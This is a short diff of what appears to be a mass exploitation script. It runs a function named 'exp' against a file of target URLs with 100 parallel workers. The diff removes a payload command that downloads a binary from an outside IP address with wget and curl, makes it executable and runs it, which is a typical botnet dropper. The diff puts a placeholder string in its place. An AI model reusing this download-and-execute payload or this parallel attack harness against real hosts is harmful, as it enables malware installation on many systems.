@@ -29,7 +29,7 @@ def exp(host):
 
 
 if __name__ == '__main__':
-    cmd = "wget http://51.81.133.90/NWWW.6;curl -O http://51.81.133.90/NWWW.6;chmod 777 *;./NWWW.6"
+    cmd = "xaxa"
     with ThreadPoolExecutor(max_workers=100) as pool:
         with open(sys.argv[1], 'r') as f:
             task = [pool.submit(exp, url) for url in f.readlines()]
